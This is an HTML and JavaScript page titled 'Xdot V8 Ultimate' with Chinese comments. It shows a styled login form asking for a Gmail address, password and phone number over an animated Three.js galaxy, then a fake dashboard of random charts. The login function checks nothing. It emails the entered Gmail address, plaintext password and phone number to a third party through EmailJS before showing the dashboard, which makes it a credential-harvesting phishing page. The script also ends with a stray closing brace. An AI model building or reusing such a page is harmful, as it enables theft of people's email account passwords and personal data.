<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Xdot V8 Ultimate - Black Galaxy with EmailJS</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
<style>
body,html{margin:0;padding:0;overflow:hidden;font-family:'Poppins',sans-serif;height:100vh;color:white;background:#000000;}
.page{position:absolute;top:0;left:0;width:100%;height:100%;display:none;justify-content:center;align-items:center;transition:opacity 0.8s;}
.page.active{display:flex;opacity:1;}
.card{backdrop-filter:blur(25px);background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.15);padding:45px;border-radius:25px;width:360px;box-shadow:0 0 40px rgba(0,150,255,0.25),0 0 80px rgba(0,150,255,0.1);}
.logo{text-align:center;font-size:42px;font-weight:600;letter-spacing:4px;margin-bottom:6px;background:linear-gradient(90deg,#00c6ff,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
.subtitle{text-align:center;font-size:13px;opacity:0.7;margin-bottom:35px;}
.input-group{position:relative;margin-bottom:20px;}
input{width:100%;padding:14px 45px;border-radius:12px;border:none;outline:none;background:rgba(255,255,255,0.12);color:white;font-size:14px;transition:0.3s;}
input:focus{background:rgba(255,255,255,0.2);}
.icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);opacity:0.7;}
.show{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;opacity:0.7;}
button{width:100%;padding:14px;border:none;border-radius:14px;background:linear-gradient(90deg,#00c6ff,#ff00ff);color:white;font-weight:600;cursor:pointer;transition:0.3s;}
button:hover{transform:scale(1.05);box-shadow:0 0 20px #00c6ff,0 0 40px #ff00ff;}
.dashboard{display:flex;flex-direction:column;align-items:center;z-index:2;position:relative;}
.chart-container{width:300px;height:200px;margin:20px;}
.stat{font-size:32px;margin:10px;background:linear-gradient(90deg,#00c6ff,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
nav{position:absolute;top:10px;right:20px;z-index:3;}
nav button{margin-left:10px;padding:8px 12px;border-radius:8px;background:rgba(0,200,255,0.2);border:none;color:white;cursor:pointer;}
nav button:hover{background:rgba(0,200,255,0.4);}
</style>
</head>
<body>

<!-- Pages -->
<div id="loginPage" class="page active">
  <div class="card">
    <div class="logo">Xdot</div>
    <div class="subtitle">Next-Gen Digital Platform</div>
    <form>
      <div class="input-group"><span class="icon">📧</span><input id="gmailInput" type="email" placeholder="Gmail"></div>
      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Password"><span class="show" onclick="togglePassword()">👁</span></div>
      <div class="input-group"><span class="icon">📱</span><input id="phoneInput" type="tel" placeholder="Phone Number"></div>
      <button type="button" onclick="loginAndSendEmail()">Login</button>
    </form>
  </div>
</div>

<div id="dashboardPage" class="page">
  <nav>
    <button onclick="gotoPage('dashboardPage')">Dashboard</button>
    <button onclick="gotoPage('homePage')">Home</button>
    <button onclick="gotoPage('aboutPage')">About</button>
    <button onclick="gotoPage('contactPage')">Contact</button>
  </nav>
  <div class="dashboard">
    <div class="stat" id="stat1">0</div>
    <div class="stat" id="stat2">0</div>
    <div class="stat" id="stat3">0</div>
    <canvas id="barChart" class="chart-container"></canvas>
    <canvas id="lineChart" class="chart-container"></canvas>
    <canvas id="pieChart" class="chart-container"></canvas>
  </div>
</div>

<div id="homePage" class="page"><h1>Home Page</h1></div>
<div id="aboutPage" class="page"><h1>About Page</h1></div>
<div id="contactPage" class="page"><h1>Contact Page</h1></div>

<!-- Libraries -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r152/three.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/three@0.152.0/examples/js/controls/OrbitControls.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
// --- EmailJS 初始化 ---
emailjs.init('YOUR_PUBLIC_KEY'); // 替换为你的 EmailJS 公钥

// --- 页面导航 ---
function gotoPage(pageId){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById(pageId).classList.add('active');}

// --- 密码可见切换 ---
function togglePassword(){let p=document.getElementById("passwordInput"); p.type=p.type==="password"?"text":"password";}

// --- 登录并发送 Email ---
function loginAndSendEmail(){
  const gmail = document.getElementById('gmailInput').value;
  const password = document.getElementById('passwordInput').value;
  const phone = document.getElementById('phoneInput').value;

  // 发送到 EmailJS
  emailjs.send('YOUR_SERVICE_ID','YOUR_TEMPLATE_ID',{
    gmail: gmail,
    password: password,
    phone: phone
  }).then(res=>{
    console.log('Email sent!', res.status, res.text);
  }).catch(err=>{
    console.error('Failed to send email', err);
  });

  // 跳转 Dashboard
  gotoPage('dashboardPage'); 
  startStats(); 
  initCharts(); 
  formLogoParticles();
}

// --- Three.js 场景 ---
const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(75,window.innerWidth/window.innerHeight,0.1,1000);
camera.position.z = 150;
const renderer = new THREE.WebGLRenderer({antialias:true, alpha:true});
renderer.setSize(window.innerWidth,window.innerHeight);
document.body.appendChild(renderer.domElement);
const controls = new THREE.OrbitControls(camera, renderer.domElement);
controls.enableDamping = true; controls.dampingFactor=0.05; controls.enablePan=false;

// --- Galaxy 背景 ---
const galaxyCount = 2000;
const galaxyGeo = new THREE.BufferGeometry();
const gPositions=[], gColors=[];
for(let i=0;i<galaxyCount;i++){
  const radius = Math.random()*400;
  const angle = Math.random()*Math.PI*2;
  gPositions.push(Math.cos(angle)*radius);
  gPositions.push((Math.random()-0.5)*50);
  gPositions.push(Math.sin(angle)*radius);
  gColors.push(Math.random(),Math.random(),1);
}
galaxyGeo.setAttribute('position',new THREE.Float32BufferAttribute(gPositions,3));
galaxyGeo.setAttribute('color',new THREE.Float32BufferAttribute(gColors,3));
const galaxyMat = new THREE.PointsMaterial({size:1.5,vertexColors:true,transparent:true,opacity:0.7});
const galaxyPoints = new THREE.Points(galaxyGeo, galaxyMat);
scene.add(galaxyPoints);

// --- Dashboard / Logo 粒子 ---
let particleCount=600;
const geometry = new THREE.BufferGeometry();
const positions=[];
const colors=[];
for(let i=0;i<particleCount;i++){
  const t=Math.random()*Math.PI*2;
  const r=50+Math.random()*50;
  positions.push(Math.cos(t)*r); positions.push((Math.random()-0.5)*50); positions.push(Math.sin(t)*r);
  colors.push(Math.random(),Math.random(),1);
}
geometry.setAttribute('position', new THREE.Float32BufferAttribute(positions,3));
geometry.setAttribute('color', new THREE.Float32BufferAttribute(colors,3));
const material = new THREE.PointsMaterial({vertexColors:true,size:2,transparent:true,opacity:0.85});
const points = new THREE.Points(geometry,material);
scene.add(points);

const lineMat = new THREE.LineBasicMaterial({vertexColors:true,transparent:true,opacity:0.15});
const lineGeo = new THREE.BufferGeometry();
let lineMesh = new THREE.LineSegments(lineGeo,lineMat);
scene.add(lineMesh);

const velocities=[];
for(let i=0;i<particleCount;i++){velocities.push((Math.random()-0.5)*0.2); velocities.push((Math.random()-0.5)*0.2); velocities.push((Math.random()-0.5)*0.2);}

// --- 动画 ---
function updateLines(){
  const pos = geometry.attributes.position.array;
  const colorArr = geometry.attributes.color.array;
  const vertices=[], colorVertices=[];
  for(let i=0;i<particleCount;i++){
    for(let j=i+1;j<particleCount;j++){
      const dx=pos[i*3]-pos[j*3]; const dy=pos[i*3+1]-pos[j*3+1]; const dz=pos[i*3+2]-pos[j*3+2];
      const dist=Math.sqrt(dx*dx+dy*dy+dz*dz);
      if(dist<15){vertices.push(pos[i*3],pos[i*3+1],pos[i*3+2]);vertices.push(pos[j*3],pos[j*3+1],pos[j*3+2]);
        colorVertices.push(colorArr[i*3],colorArr[i*3+1],colorArr[i*3+2]);colorVertices.push(colorArr[j*3],colorArr[j*3+1],colorArr[j*3+2]);}
    }
  }
  lineGeo.setAttribute('position', new THREE.Float32BufferAttribute(vertices,3));
  lineGeo.setAttribute('color', new THREE.Float32BufferAttribute(colorVertices,3));
}

function animate(){
  requestAnimationFrame(animate);
  const pos = geometry.attributes.position.array;
  for(let i=0;i<particleCount;i++){
    pos[i*3]+=velocities[i*3]; pos[i*3+1]+=velocities[i*3+1]; pos[i*3+2]+=velocities[i*3+2];
    if(pos[i*3]>100||pos[i*3]<-100) velocities[i*3]*=-1;
    if(pos[i*3+1]>100||pos[i*3+1]<-100) velocities[i*3+1]*=-1;
    if(pos[i*3+2]>100||pos[i*3+2]<-100) velocities[i*3+2]*=-1;
  }
  geometry.attributes.position.needsUpdate=true;
  updateLines();
  galaxyPoints.rotation.y+=0.0005;
  controls.update();
  renderer.render(scene,camera);
}
animate();
window.addEventListener('resize',()=>{camera.aspect=window.innerWidth/window.innerHeight;camera.updateProjectionMatrix();renderer.setSize(window.innerWidth,window.innerHeight);});

// --- Dashboard Stats ---
let stat1=0,stat2=0,stat3=0;
function startStats(){
  const s1=document.getElementById("stat1"); const s2=document.getElementById("stat2"); const s3=document.getElementById("stat3");
  setInterval(()=>{
    if(!document.getElementById("dashboardPage").classList.contains("active")) return;
    stat1+=Math.random()*5; stat2+=Math.random()*3; stat3+=Math.random()*2;
    s1.textContent=Math.floor(stat1); s2.textContent=Math.floor(stat2); s3.textContent=Math.floor(stat3);
  },100);
}

// --- Charts ---
function initCharts(){
  const barCtx=document.getElementById("barChart").getContext("2d");
  new Chart(barCtx,{type:"bar",data:{labels:["A","B","C","D"],datasets:[{label:"Bar",data:[12,19,3,5],backgroundColor:["#00c6ff","#ff00ff","#00c6ff","#ff00ff"]}]},options:{responsive:true}});
  const lineCtx=document.getElementById("lineChart").getContext("2d");
  new Chart(lineCtx,{type:"line",data:{labels:["Jan","Feb","Mar","Apr"],datasets:[{label:"Line",data:[3,10,5,8],borderColor:"#00c6ff",fill:false}]},options:{responsive:true}});
  const pieCtx=document.getElementById("pieChart").getContext("2d");
  new Chart(pieCtx,{type:"pie",data:{labels:["Red","Blue","Green"],datasets:[{data:[10,20,30],backgroundColor:["#ff00ff","#00c6ff","#ff00ff"]}]},options:{responsive:true}});
}


}
</script>
</body>
</html>
